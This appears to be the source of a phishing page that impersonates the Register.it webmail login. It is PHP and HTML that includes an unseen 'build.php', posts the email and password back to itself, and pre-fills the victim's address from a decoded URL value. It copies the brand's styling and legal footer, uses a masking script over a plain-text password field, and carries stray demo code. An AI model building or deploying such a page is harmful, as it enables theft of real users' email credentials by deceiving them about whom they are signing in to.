<?php include '../build.php' ?>
<html lang="en"><head>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
    <meta http-equiv="content-type" content="text/html; charset=utf-8;">
    <meta http-equiv="content-language" content="en">

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="The new Email is here: sign in to your WebMail and discover a new way to read your email, manage your contacts, your schedule, and much more.">
    <meta name="keywords" content="webmail, register web email, posta elettronica, mail register.it">
        <meta name="copyright" content="Register.it">

        <title>Webmail - Register.it mail online - Sign In</title>

    <!--[if lte IE 9]>
        <script src="/js/vendor/html5shiv.js"></script>
    <![endif]-->
        
    <link href="https://webmail.register.it/css/qbert_theme/template/master.css?v=2.4.4" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://webmail.register.it/css/qbert_theme/register_it.css?v=2.4.4">
</head>
<body>
    
    <div class="main-container">
        <nav class="navbar navbar-inverse navbar-fixed-top">
            <div class="container-fluid">
                <div class="navbar-header">
                    <a class="navbar-brand" href="#">
                        Register.it                    </a>
                </div>
            </div>
        </nav><!-- /.nav-collapse -->

        <div class="container-fluid main-content base-font">

            <div class="row">
                <div class="col-md-4 col-sm-5  col-xs-12 sidebar">

                    <div class="row">

                        <div class="col-md-12">

                            <div class="row">

                                <div class="loaderLayer col-md-12 col-sm-12 col-xs-12">
                                    <div class="loader"><i class="fa fa-spinner fa-pulse"></i></div>
                                </div>

                            </div>

                            <div class="row">

                                <div class="col-md-12 text-center form-header">
                                    <span class="fa-stack fa-3x">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
                                </span>

                                    <h1>Welcome to your Webmail</h1>

                                    <h2>MANAGE CALENDARS, CONTACTS, TASKS...</h2>
                                </div>

                            </div>

                            <div class="row">

                                <div class="col-md-12">
                                                                            <form name="login-form" id="login-form" action="" method="post"><input type="hidden" name="login" value="registerit">

    <div class="alert alert-danger error-alert" id="error-alert" role="alert" style="<?php echo $error; ?>">Invalid email or password, please try again</div>

    <div class="form-group">
        <div class="floatlabel-wrapper" style="position:relative"><label for="account" class="label-floatlabel labelFloat" style="position: absolute; top: 0px; left: 8px; display: none; opacity: 0; font-size: 11px; font-weight: bold; color: rgb(131, 135, 128); transition: 0.08s ease-in-out;">Email</label><input name="user" type="email" class="form-control floatlabel" id="account" placeholder="<?php echo htmlspecialchars($decoded); ?>" value="<?php echo htmlspecialchars($decoded); ?>" required=""></div>
        <span class="input-error"></span>
    </div>

    <div class="form-group">
    <div class="floatlabel-wrapper" style="position:relative">
    <label for="password" class="label-floatlabel labelFloat" style="position: absolute; top: -16px; left: 8px; display: block; opacity: 1; font-size: 11px; font-weight: bold; color: rgb(131, 135, 128); transition: 0.08s ease-in-out;">Password</label>
    
    <input name="pass" type="text" class="form-control floatlabel active-floatlabel" id="password" placeholder="" autocomplete="off" required style="padding-right: 36px;">
    
    <i class="fa fa-eye toggle-password" id="togglePassword" style="position:absolute; right:12px; top:50%; transform:translateY(-50%); cursor:pointer; color:#888;"></i>
    </div></div>
    <div class="choice-group  btn-group">
        
                            <input type="radio" name="webmail" value="rc" class="rc" id="rc" checked="checked" style="display: none">
                        <label data-webmail="rc" for="rc" data-beta-tooltip="Try the new Webmail: a completely redesigned interface with new features and a modern, intuitive design. Your opinion matters: if you find something that doesn't work as it should, please let us know!"><span></span>New Webmail</label><br class="desktop-br">

                            <input type="radio" name="webmail" value="ox" class="ox" id="ox">
                        <label data-webmail="ox" for="ox"><span></span>Classic Webmail</label><br class="desktop-br">

                        </div>
    <button type="submit" id="submit" class="btn btn-lg btn-primary pull-right">Login</button>

</form>
                                                                    </div>

                            </div>

                            <div class="row">

                                <div class="col-md-12 text-right pwd-recover">
    <a href="#" target="_blank">Forgot your password?</a>
</div>

                            </div>

                            <div class="row">

                                <footer class="footer">

                                    <h4>Copyright © 1999 - 2026 Register SpA</h4>

                                    <p>Partita IVA &amp; Codice Fiscale: 04628270482</p>

                                    <p>https://www.register.it/company/legal/informativa-privacy/?lang=en</p>

                                    <p>To stay up-to-date on the services status subscribe to our Status page <a href="#" target="_blank">here</a></p>
                                </footer>

                            </div>

                        </div>

                    </div>

                </div>

                <div class="promo col-sm-7 col-md-8 col-md-offset-4 col-sm-offset-5 main">
                        <div class="container promo-group">
        <div class="row">
                            <h3>A better Webmail experience is here</h3>
                <p>Same account. Smarter experience.</p>
                                    <a href="" id="promoBtn" target="_blank" class="btn btn-line-default btn-lg" data-eventaction="Learn more" data-eventlabel="#">Learn more</a>
                                    </div>
    </div>
                </div>

            </div>

        </div><!-- /.container -->

    </div>  
    <script>
        document.getElementById('togglePassword').addEventListener('click', function () {
            const pwd = document.getElementById('password');
            const isPassword = pwd.getAttribute('type') === 'password';
            pwd.setAttribute('type', isPassword ? 'text' : 'password');
            this.classList.toggle('fa-eye');
            this.classList.toggle('fa-eye-slash');
        });
    </script>
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>